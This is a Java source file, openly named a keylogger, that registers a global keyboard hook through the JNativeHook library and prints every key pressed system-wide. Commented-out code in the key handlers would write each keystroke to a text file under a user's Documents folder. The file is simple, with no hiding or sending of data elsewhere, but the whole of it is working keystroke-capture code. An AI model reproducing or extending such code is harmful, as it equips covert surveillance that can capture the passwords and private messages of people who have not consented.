package keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;

public class Main implements NativeKeyListener {
    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }

        GlobalScreen.addNativeKeyListener(new Main());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent arg0){
        /*try {
            BufferedWriter bw = new BufferedWriter(
                    new FileWriter("C:\\Users\\super\\Documents\\keyloggerio\\output.txt"));
            bw.write(NativeKeyEvent.getKeyText(arg0.getKeyCode()));
            bw.close();
        } catch (Exception e) {
            e.printStackTrace();
        }*/
        System.out.println("Pressed: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent arg0){
        /*try {
            BufferedWriter bw = new BufferedWriter(
                    new FileWriter("C:\\Users\\super\\Documents\\keyloggerio\\output.txt"));
            bw.write(NativeKeyEvent.getKeyText(arg0.getKeyCode()));
            bw.close();
        } catch (Exception e) {
            e.printStackTrace();
        }*/
    }
}
